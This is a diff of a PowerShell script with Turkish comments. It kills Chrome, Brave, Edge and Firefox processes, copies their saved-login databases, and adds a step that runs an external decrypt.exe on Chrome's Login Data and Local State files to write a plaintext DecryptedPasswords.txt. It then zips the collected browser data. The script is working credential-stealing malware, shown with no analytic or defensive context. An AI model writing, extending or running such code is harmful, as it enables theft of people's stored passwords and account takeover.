@@ -38,14 +38,12 @@ $chromeDir = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default"
 $chromeFilesToCopy = @("Login Data")
 KillBrowserProcesses "chrome"
 CopyBrowserFiles "Chrome" $chromeDir $chromeFilesToCopy
-Copy-Item -Path "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State" -Destination (Join-Path -Path $destDir -ChildPath "Chrome") -ErrorAction SilentlyContinue
 
 # Configuration for Brave
 $braveDir = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default"
 $braveFilesToCopy = @("Login Data")
 KillBrowserProcesses "brave"
 CopyBrowserFiles "Brave" $braveDir $braveFilesToCopy
-Copy-Item -Path "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Local State" -Destination (Join-Path -Path $destDir -ChildPath "Brave") -ErrorAction SilentlyContinue
 
 # Configuration for Firefox
 $firefoxProfileDir = Join-Path -Path $env:APPDATA -ChildPath "Mozilla\Firefox\Profiles"
@@ -64,7 +62,26 @@ $edgeDir = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default"
 $edgeFilesToCopy = @("Login Data")
 KillBrowserProcesses "msedge"
 CopyBrowserFiles "Edge" $edgeDir $edgeFilesToCopy
-Copy-Item -Path "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Local State" -Destination (Join-Path -Path $destDir -ChildPath "Edge") -ErrorAction SilentlyContinue
+
+# Decrypt the copied Login Data files using decrypt.exe
+$decryptExePath = Join-Path -Path "$destDir\Chrome" -ChildPath "decrypt.exe"
+$loginDataPath = Join-Path -Path "$destDir\Chrome" -ChildPath "Login Data"
+$localStatePath = Join-Path -Path "$env:LOCALAPPDATA\Google\Chrome\User Data" -ChildPath "Local State"
+
+if (Test-Path $decryptExePath -and Test-Path $loginDataPath -and Test-Path $localStatePath) {
+    $outputPath = Join-Path -Path $destDir -ChildPath "DecryptedPasswords.txt"
+    
+    # Run the decrypt.exe
+    & $decryptExePath -1stfile $loginDataPath -2ndfile $localStatePath -output $outputPath
+    
+    if (Test-Path $outputPath) {
+        Write-Host "Decrypted passwords saved to: $outputPath"
+    } else {
+        Write-Host "Decrypted passwords not found."
+    }
+} else {
+    Write-Host "Decrypt.exe, Login Data, or Local State not found."
+}
 
 # Klasörü ZIP dosyasına sıkıştırma
 $zipDir = "$env:APPDATA\ZippedBrowserData"
@@ -137,4 +154,3 @@ if (Test-Path $zipFilePath) {
 } else {
     Write-Host "ZIP dosyası bulunamadı: $zipFilePath"
 }
-
